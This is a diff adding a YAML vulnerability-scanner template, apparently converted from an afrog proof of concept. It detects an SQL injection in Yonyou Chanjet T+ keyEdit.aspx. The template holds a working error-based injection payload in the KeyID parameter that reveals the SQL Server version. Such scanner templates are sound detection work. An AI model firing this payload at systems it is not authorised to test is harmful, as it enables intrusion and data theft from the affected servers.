@@ -1,0 +1,24 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: word
+        part: body
+        words:
+          - nvarchar
+          - Microsoft SQL Server
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1'
+id: yonyou-chanjet-tplus-keyedit-sqli
+info:
+  author: k5rC85Lma
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 用友 畅捷通T+ keyEdit SQL注入漏洞
+  severity: high
+  tags: yonyou,chanjet,sqli,argus-import
